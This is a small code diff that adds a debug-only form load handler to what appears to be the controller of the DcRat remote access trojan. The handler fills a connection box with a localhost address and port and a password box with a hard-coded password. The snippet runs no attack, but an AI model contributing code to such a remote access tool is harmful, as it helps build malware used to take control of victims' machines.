@@ -38,5 +38,13 @@ namespace DcRat
                 this.Close();
             }
         }
+
+        private void FormInit_Load(object sender, EventArgs e)
+        {
+#if DEBUG
+            textBoxasddress.Text = "127.0.0.1:8848";
+            textBoxpassword.Text="qwqdanchun";
+#endif
+        }
     }
 }
